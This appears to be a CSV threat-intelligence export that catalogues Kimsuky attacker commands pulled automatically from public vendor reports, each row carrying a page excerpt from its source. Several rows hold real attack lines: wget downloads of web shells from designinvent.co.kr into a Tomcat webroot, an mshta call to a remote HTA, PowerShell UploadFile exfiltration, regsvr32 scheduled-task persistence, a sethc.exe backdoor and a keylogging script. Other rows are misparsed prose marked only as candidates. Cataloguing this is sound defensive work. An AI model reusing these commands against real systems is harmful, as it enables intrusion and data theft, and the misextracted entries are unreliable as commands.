1.0.0,actor--kimsuky,artifact--sha256:82a6d8584b65faf1163fcf9ce76c99f54d9b527091065597bcd59fc9b9849aa3,observation--sha256:514dc365ff18c7eec53467157e106b31c886f010c7d338bd72b71a2befaa3ae8,command,powershell.exe N/A,powershell.exe N/A,candidate,2021-11-02T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 71}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"(2) certuser.info In the table below (Table 36), hxxp://bipaf.org is the C2 through which the malicious document (MD5: 90a56bc6a66bb4e02265389529757460) communicates, and namastte has been hacked by the Kimsuky organization since November 2021, before April 2022, which was recognized by AhnLab. Abuse with C2 (Table 36) Malicious behavior log of 21*.16*.25*.5*(KR) A total of 45 malicious URLs with similar patterns were mapped to 21*.9*.1*.16*(KR) where certuser.info was mapped. 71 22*.15*.24*.13*",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:508bf1137885d8e71934c12f8dc92cf1e69c2b55e7026af857fe4dd66c802c17,observation--sha256:16e9e5e11fb87824c107e49a3212514ad2ed15ef1970360f14b85dc1660a37cf,command,powershell.exe start-process regsvr32.exe -argumentlist '/s [木马路径]' -verb runas,powershell.exe start-process regsvr32.exe -argumentlist '/s [木马路径]' -verb runas,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--abb1fb8523b62634,kimsuky/Kimsuky APT Group targeted on South Korean defense and security departments.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,微步在线科技有限公司 | www.threatbook.cn | 400-030-1051 图[11].RAT 模块中设置注册表开机启动项 接着以“SpyRegsvr32-20210507140631”为名创建互斥体，此种类型互斥体在 Kims uky 之前的攻击活动中多次出现，其中有“Spy”关键字和编译时间信息“20210507”。 图[12].RAT 模块中创建互斥体 通过检查 UAC 注册表项 ConsentPromptBehaviorAdmin 和 PromptOnSecureDesktop 来确定 UAC 是否关闭，以及是否为管理员模式，如果否的话将会调用 powershell 提权运行。 powershell.exe start-process regsvr32.exe -argumentlist '/s [木马路径]' -verb runas 木马使用两层命令结构与 C2 服务器通信，使用的 C2 服务器为：anto.shore.ml。 ?m={指令 1}&p1={硬盘序列号}&p2={指令 2} 该模块可支持多种间谍类型的远控功能，包括远程 Shell、文件上传/下载,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d3da8195543b381db459ad84b2e36799973ce0905f4c4c110186883594b82e3d,observation--sha256:0adda1703120ea5d23fe94305be64d68b39de29b21e760e23ccbfcc90bce576e,command,"regsvr32, it is registered in the registry (the DllRegisterServer function is called).","regsvr32, it is registered in the registry (the DllRegisterServer function is called",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 15}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 15VIRUS BULLETIN CONFERENCE OCTOBER 2021  Mutex name - windows update server real time mui cache - windows update {2020-1050-01-01-0001-I}  Scheduler - schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\ Driverdriver.cfg""""/sc minute /mo30  The path to the file is finally downloaded and executed - %APPDATA%\Roaming\Intel\DriverSoftware\Microsoft\Windows\Defender  C&C add",
1.0.0,actor--kimsuky,artifact--sha256:8f926e1a641591465e65db5f2c1286f952bccc15895847f9c8c2b88f78f50717,observation--sha256:b3c5bb5145352fe450cd9af9dd100a0c62091eb64249d7eeb656d574c6ff76dc,command,"retu=wShell.run(""cmd.exe /c powershell.exe (New-Object System.Net.WebClient).UploadFile","retu=wShell.run(""cmd.exe /c powershell.exe (New-Object System.Net.WebClient).UploadFile",candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 13}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"In addition, the file name 'upload.php' is used in common for information leakage. The C2 server exploiting the HWP vulnerability is in Korea, and the C2 server exploiting DOC vulnerability contains the subaddress 'kr' in the middle of the address. Also, both files have exactly the same registry key 'VBAWarnings' and the log file name 'ttmp.log'. Many of the traces mentioned above and the similar pattern of server-side attacks are suggesting that both HWP malicious documents found in Korea and t",
1.0.0,actor--kimsuky,artifact--sha256:e08a234a53738494955dca45422ea0f17afbae4238cb43574cd9de5a779a42e1,observation--sha256:abbb9f312336c460d200eee381a064ba7a239c9136c8fca95bb067ddfbcdde1e,command,retu=wShell.run(“powershell.exe (New-Object System.Net.WebClient).UploadFile,retu=wShell.run(“powershell.exe (New-Object System.Net.WebClient).UploadFile,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 13}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"In addition, the file name 'upload.php' is used in common for information leakage. The C2 server exploiting the HWP vulnerability is in Korea, and the C2 server exploiting DOC vulnerability contains the subaddress 'kr' in the middle of the address. Also, both files have exactly the same registry key 'VBAWarnings' and the log file name 'ttmp.log'. Many of the traces mentioned above and the similar pattern of server-side attacks are suggesting that both HWP malicious documents found in Korea and t",
1.0.0,actor--kimsuky,artifact--sha256:9c630a0b5ae8ffb08eeacdc529c82100230363616ac16142568958ecfbe51cb2,observation--sha256:303e6e675c0e457440833c11ac91d533a13fe1c2fdc89e07a6e42b9a587ac2ab,command,"schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s","schtasks/create/f/tn""Intel\Disk\Volume1""/tr""C:\Windows\system32\regsvr32.exe/s",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 11}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 11VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 02: bootstrap.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&m=login (Web page newly moved by iframe.) <script> </script><scripttype=""text/javascript""> $(function(){ functionsend(value=""""){ $.ajax({ url:""ga.js"", type:""post"", data:{ _:""[BASE64(ID)]"", token:btoa(value) } }); } $(""input"").keydown(function(evt) { send(""keydown:""+evt.target.value); }); $(""input"").change(function(evt) {",
1.0.0,actor--kimsuky,artifact--sha256:fa99d253b393189faece77a400c14312a4f8583130b5e2a9429fb01e7b8b3149,observation--sha256:4c8917aab1df5ec527c71e7aa10fba939a511ae6588c9a7ac943a01b4e416cb2,command,"set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry.","set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 21}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"8 RdpScan_A01.exe dpscan.pdb D:\Wrk\RDP\Report\puma\RdpScan_2019\src\vs15\x64\Release\r Operation Covert Stalker Report [+] Malicious code from scanner number 1 set.hta, which mshta.exe downloads and runs, is added to IFEO (Image File Execution Options) in the registry. sethc.exe.bak&copy cmd.exe sethc.exe"" This method has been around for a long time, meaning that the user can run a different file than the one they were trying to run. I have configured the site as below to download and run the s",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2dadffd3d260196b3fb5d9ceab611364b2a8503e2bb62cf4cedbae50c593f87c,observation--sha256:0b7a0fc687d902327e20c9e3c0fd2b50e083ef4a9f5f2d5373aded35fcdc5f5e,command,"show.php file, used by malicious PowerShell scripts to upload information collected from hacked target systems","show.php file, used by malicious PowerShell scripts to upload information collected from hacked target systems",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"[+] (Ministry of Unification) North Korea Information Portal: ua.zip hxxps://nkinfo.unikorea.go.kr/nkp/term/skNkItTerm.do?pageIndex=32 (Table 15) At the time of recognizing the purpose of the Cook folder, namastte, only show.php existed, so it was difficult to determine the exact upload method or its relationship with other files, but it was confirmed in the analysis of other cases. Malware that uses show.php is shown below (Figure 26). I found a North Korean expression in the comments of index.",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:84d5ca7888f5d84179a5c1bde616a7190a542267bf391aae284ed7f4662d83ac,observation--sha256:8a9ad15ea739234639ac47b80e43428aa27049b423e1f5f5365150a9edc0a3a4,command,strike loaders and reverse shells written i n powershell.,strike loaders and reverse shells written i n powershell,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--85ca2c2dc29118d8,kimsuky/APTDown/phrack-apt-down-the-north-korea-files_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"MAPT Down: The N o r t h Korea Files The Google Chrome conﬁguration ﬁles contain these links. Does KIM use (his?) google creds t o access these sites? Is w w h 1 0 0 4 his G i t H u b account? Did he use google-pay t o pay f o r the three VPN services? ""https://accounts.google.com:443, https://[*.]0x1.gitlab.io"": ""https://accounts.google.com:443, https://[*.]aldeid.com"": ""https://accounts.google.com:443, https://[*.Jasawicki.info"": ""https://accounts.google.com:443, https://[*.]devglan.com"": ""htt",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:1c2379095cdbfd1ae0923327966a5223ea61a3a936ec1cabd756ab2639535071,observation--sha256:eea04bca20b660aef2e86342c9a43f9c88644dd703afaf75d44866d2023bbb64,command,the internal VBScript command and the additional PowerShell commands would be subsequently executed.,the internal VBScript command and the additional PowerShell commands would be subsequently executed,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 7}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,".Forward = True .Wrap = wdFindContinue .MatchWholeWord = True End With Selection.Find.Execute Replace:=wdReplaceAll End Sub Sub AutoOpen() Shell (""mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta"") End Sub If the 'Vkggy0.hta' in the code above is loaded normally, it will receive an HTTP GET response by executing the internal VBScript command and the additional PowerShell commands would be subsequently executed. The recently found malicious document files also have the same sequence ",
1.0.0,actor--kimsuky,artifact--sha256:17b811713fc48926b982735cd4ab0133d701a4dab0e48d64c9a4be86cbe70a68,observation--sha256:9b8162bb0eb2b98e8dc6ef20f55c9bbc3ce9aef7646d5b312b604fc603d932c9,command,"the use of PowerShell, JavaScript, VBScript, and batch files, alongside LNK and","the use of PowerShell, JavaScript, VBScript, and batch files, alongside LNK and",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 It is worthy to note that when double-clicking msc files on default windows systems there is a User Account Control (UAC) warning that may hinder an attack. Figure 10 - A CommandLine Task in the .msc In the screenshot above showing an MSC CommandLine Task payload: 1. Open Google Docs lure 2. Execute tasklist and write results to file 3. Echo VBScript to disk 4. Execute VBScript The VBScript in this example simply POSTs collected process information to the server. Despite this being a simple e,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b41de3f93de3f5684f00ad5e05a356c60b4816d22f67e493679bce277eb4fdb2,observation--sha256:a9b685bbc9b6d87d198eb95340dfa9271204f9ef6162fd41ec104d8e55122e94,command,"transferred ""cmd.exe /c takeown /f \""sethc.exe\""&icacls \""sethc.exe\"" /grant SYSTEM:f&ren sethc.exe","transferred ""cmd.exe /c takeown /f \""sethc.exe\""&icacls \""sethc.exe\"" /grant SYSTEM:f&ren sethc.exe",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The types of virtual channels are as follows. Right picture of (Figure 9) ÿ rdpdr: File system extension. Access from server to client file system (Table 2) Condition comparison code of r_sethc_x64.exe To activate the sticky key function, press the Shift key five times in succession and the sticky key window will appear as shown below (Figure 10), which is handled by sethc.exe. However, if cmd.exe is copied to secthc.exe, cmd.exe can be executed by pressing the Shift key five times in a row, so ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:552134cc04ea50a173f293142ed58abfbd2bdcf434e734bed15171a1b626bc4e,observation--sha256:8604846676cb889203ecf489032201e04c19cb81d362a480a777b192fdd27d53,command,"wget ""http://designinvent.co.kr/test.txt"" -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx","wget ""http://designinvent.co.kr/test.txt"" -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:5825657c485d30f3049e1a5221a7923dc7c2b8588bb7ff17e9711962b7985889,observation--sha256:f2f44f280df028e344f2b8a09facc47439c8d7d2a8e85e3b0a984ed46e4a23da,command,wget http://designinvent.co.kr/2.b -O /tmp/abc.e,wget http://designinvent.co.kr/2.b -O /tmp/abc.e,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:506b51b847301b60a614f7101594ba73deea02f1b84822b782fc58f861374400,observation--sha256:1dd88b03fe41db1e67643eafa11c8d747b05f9f94ea2cf3a3cd9999b86804020,command,wget http://designinvent.co.kr/2.b -o /tmp/abc,wget http://designinvent.co.kr/2.b -o /tmp/abc,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:b2f2a2408727bac9a50a2e77e3249ac23ab579c32882fd682c5eea841bfea8e3,observation--sha256:20867397470661a93e63e70eb7c0a4c256edbbd153c0ed001057a5c323d8a486,command,wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:cf42fd127cc3e5e1c9b84db445c0bda09166bdc54cbb244dbde9a440abcd6969,observation--sha256:b24792c7976f4efcd358b67b6825bd990b52d836f09d271d994adc86541b73f4,command,wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:50ee1d7a3f992bb92200f2a11ebccccc6fe531f5c266be833b67440266d6d94d,observation--sha256:58009e65f8c3e840641dc103aa313207b89079eba7fb3506a59bcfbeb52da8e7,command,wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:a60e21b3154dfa48672d0a8b033bcbe576069448516d60ff4ac6f1ee31410af1,observation--sha256:80e969caf08d6f5876c5c3410a3f519686810905df59a62a18737f5451545168,command,wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:23f744cd3468c8d10fe5e25525cb7ff9a23b6e868b81725ed931f82a0271be06,observation--sha256:a699f5062cf2cfa76afc8f107b386626e6aa0556fa0a7a772a8e1d219b340ebf,command,wget http://designinvent.co.kr/b.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist1.txt,wget http://designinvent.co.kr/b.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist1.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:ccf48dd6c0b6fbbab38405bc9748c61cd3d3386519faf56c6cc1db43ff8bdb4e,observation--sha256:c6055dd79b5ca3044fc940cb09f120d8cba1a50510e9d4ab2455ead4c1ea2bb5,command,wget http://designinvent.co.kr/c.j -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,wget http://designinvent.co.kr/c.j -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:e881276280ec081e0fb34641e006ee138728a2167f2ffa7377b86586ded5094e,observation--sha256:6dadf2228100739c71d3a56db3302e5f76a4866e3b98871fcfd9642661840aac,command,wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:bd6b09d06a7fc5740865b9cb20140adacc9ac0acd10474e607a52575c9853e78,observation--sha256:cd0de296b003e24843431384a8d6e92c0423941eb8f67ceafc15ab83ef90d27f,command,wget http://designinvent.co.kr/d.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about2.jspx,wget http://designinvent.co.kr/d.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about2.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:8b1c2c790dc6e78b36f830996453c4d604e3d6fee34ec1f762a763bdfc8406f6,observation--sha256:eb2e6bb5f096568289a3dd11518336900fe5294d90c1e7ef759e1c05e402d778,command,wget http://designinvent.co.kr/jsp.b -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,wget http://designinvent.co.kr/jsp.b -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
